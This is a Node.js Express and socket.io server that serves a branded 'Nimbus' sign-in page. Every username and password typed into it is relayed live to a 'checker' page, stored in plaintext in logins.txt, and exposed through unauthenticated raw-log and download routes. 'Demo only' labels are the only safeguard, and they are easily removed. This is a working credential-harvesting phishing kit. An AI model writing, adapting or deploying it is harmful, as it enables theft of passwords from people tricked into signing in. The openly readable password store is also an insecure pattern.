const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const LOG_FILE = path.join(__dirname, 'logins.txt');
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '');

function readLogs() {
  try {
    const raw = fs.readFileSync(LOG_FILE, 'utf8').trim();
    if (!raw) return [];
    return raw.split('\n').map(line => {
      try { return JSON.parse(line); } catch { return null; }
    }).filter(Boolean).reverse();
  } catch { return []; }
}

function appendLog(entry) {
  fs.appendFileSync(LOG_FILE, JSON.stringify(entry) + '\n');
}

// Shared head + styles for both pages
const head = (title) => `<!DOCTYPE html><html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title} · Nimbus</title>
<style>
  :root{
    --bg:#0b0e14; --panel:#141922; --panel2:#1b2230; --border:#263041;
    --text:#e8ecf3; --muted:#8b97a8; --accent:#5b8cff; --accent2:#7aa2ff;
    --ok:#4ade80; --danger:#f87171;
  }
  *{box-sizing:border-box}
  body{
    margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;
    background:radial-gradient(1200px 600px at 50% -10%,#1a2338 0%,var(--bg) 55%);
    font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;color:var(--text);
  }
  .card{
    width:100%;max-width:420px;background:linear-gradient(180deg,var(--panel),var(--panel2));
    border:1px solid var(--border);border-radius:18px;padding:28px;
    box-shadow:0 24px 70px rgba(0,0,0,.55);
  }
  .brand{display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:6px}
  .brand img{width:36px;height:36px;object-fit:contain;display:block}
  .brand-name{font-size:20px;font-weight:700;letter-spacing:.3px}
  .badge{display:flex;justify-content:center;margin:14px 0 20px}
  .badge span{
    font-size:11px;font-weight:700;letter-spacing:1.4px;text-transform:uppercase;
    color:#ffcf7a;background:#3a2a00;border:1px solid #6b4f00;
    padding:5px 10px;border-radius:999px;
  }
  label{display:block;font-size:13px;color:var(--muted);margin:16px 0 7px;font-weight:500}
  input{
    width:100%;padding:13px 14px;background:#0e131b;border:1px solid var(--border);
    border-radius:11px;color:var(--text);font-size:15px;outline:none;
    transition:border-color .15s, box-shadow .15s;
  }
  input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(91,140,255,.18)}
  button.primary{
    width:100%;margin-top:22px;padding:13px;border:none;border-radius:11px;
    background:linear-gradient(180deg,var(--accent2),var(--accent));color:#fff;
    font-size:15px;font-weight:600;cursor:pointer;transition:filter .15s, transform .05s;
  }
  button.primary:hover{filter:brightness(1.08)}
  button.primary:active{transform:translateY(1px)}
  .status{margin-top:14px;text-align:center;font-size:13px;min-height:18px}
  .ok{color:var(--ok)}
  .err{color:var(--danger)}
  .foot{margin-top:22px;text-align:center;font-size:11px;color:var(--muted)}
  body.wide{place-items:start center;padding-top:40px}
  .wide .card{max-width:620px}
  .wide h1{font-size:18px;margin:0 0 4px}
  .wide p.sub{margin:0 0 18px;font-size:13px;color:var(--muted)}
  .row{
    background:#0e131b;border:1px solid var(--border);border-radius:11px;
    padding:12px 14px;margin-bottom:10px;font-size:14px;word-break:break-word;
  }
  .row .u{font-weight:600}
  .row .p{color:var(--muted)}
  .row .t{font-size:11px;color:var(--muted);margin-top:6px}
  .empty{color:var(--muted);font-size:14px;text-align:center;padding:18px}
  .toolbar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px}
  .btn{
    padding:10px 16px;border-radius:10px;border:1px solid var(--border);
    background:#0e131b;color:var(--text);font-size:13px;font-weight:600;
    cursor:pointer;text-decoration:none;display:inline-block;transition:border-color .15s;
  }
  .btn:hover{border-color:var(--accent)}
  .btn.danger:hover{border-color:var(--danger);color:var(--danger)}
  code{background:#0e131b;padding:2px 6px;border-radius:6px;font-size:12px}
  a.link{color:var(--accent2);text-decoration:none}
</style></head><body>`;

// Your uploaded Nimbus logo (base64 PNG)
const logo = `<img src="data:image/png;base64,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" alt="Nimbus logo">`;

// --- Login page (phone) ---
app.get('/login', (req, res) => {
  res.send(head('Sign in') + `
  <div class="card">
    <div class="brand">${logo}<span class="brand-name">Nimbus</span></div>
    <div class="badge"><span>Demo · Test only</span></div>
    <form id="f" autocomplete="off">
      <label for="u">Username</label>
      <input id="u" placeholder="demo_user" required>
      <label for="p">Password</label>
      <input id="p" type="password" placeholder="••••••••" required>
      <button class="primary" type="submit">Sign in</button>
      <div class="status" id="s"></div>
    </form>
    <div class="foot">Nimbus is a fictional demo app. Do not enter real credentials.</div>
  </div>
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const form = document.getElementById('f');
    const status = document.getElementById('s');
    form.addEventListener('submit', e => {
      e.preventDefault();
      const username = document.getElementById('u').value;
      const password = document.getElementById('p').value;
      socket.emit('login-submit', { username, password, time: new Date().toLocaleString() });
      status.textContent = '✔ Submitted (demo only)';
      status.className = 'status ok';
      form.reset();
    });
  </script>
  </body></html>`);
});

// --- Checker page (laptop) ---
app.get('/checker', (req, res) => {
  res.send(head('Checker') + `
  <div class="card">
    <div class="brand">${logo}<span class="brand-name">Nimbus</span></div>
    <div class="badge"><span>Demo · Test only</span></div>
    <h1>Live submissions</h1>
    <p class="sub">Open <code>/login</code> on your phone · <a class="link" href="/logs">raw log</a></p>
    <div class="toolbar">
      <a class="btn" href="/download">Download logins.txt</a>
      <button class="btn danger" id="clear">Clear log</button>
    </div>
    <div id="out" class="empty">Waiting for submissions…</div>
    <div class="foot">Nimbus is a fictional demo app. Do not enter real credentials.</div>
  </div>
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const out = document.getElementById('out');
    const items = [];
    const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
    function render() {
      if (!items.length) { out.className='empty'; out.textContent='Waiting for submissions…'; return; }
      out.className = '';
      out.innerHTML = items.map(i => \`
        <div class="row">
          <div class="u">\${esc(i.username)}</div>
          <div class="p">\${esc(i.password)}</div>
          <div class="t">\${esc(i.time)}</div>
        </div>\`).join('');
    }
    socket.on('history', list => { items.length = 0; items.push(...list); render(); });
    socket.on('login-submit', data => { items.unshift(data); render(); });
    socket.on('log-cleared', () => { items.length = 0; render(); });
    document.getElementById('clear').addEventListener('click', () => {
      if (confirm('Clear all logins?')) socket.emit('clear-log');
    });
  </script>
  </body></html>`);
});

// --- Raw log ---
app.get('/logs', (req, res) => {
  const logs = readLogs();
  if (!logs.length) return res.type('text/plain').send('No logins yet.');
  res.type('text/plain').send(
    logs.map(l => `[${l.time}] ${l.username} : ${l.password}`).join('\n')
  );
});

// --- Download ---
app.get('/download', (req, res) => {
  res.download(LOG_FILE, 'logins.txt');
});

// --- Relay + file ---
io.on('connection', socket => {
  socket.emit('history', readLogs());
  socket.on('login-submit', data => {
    appendLog(data);
    socket.broadcast.emit('login-submit', data);
  });
  socket.on('clear-log', () => {
    fs.writeFileSync(LOG_FILE, '');
    io.emit('log-cleared');
  });
});

app.get('/', (req, res) => res.redirect('/checker'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Listening on ' + PORT));
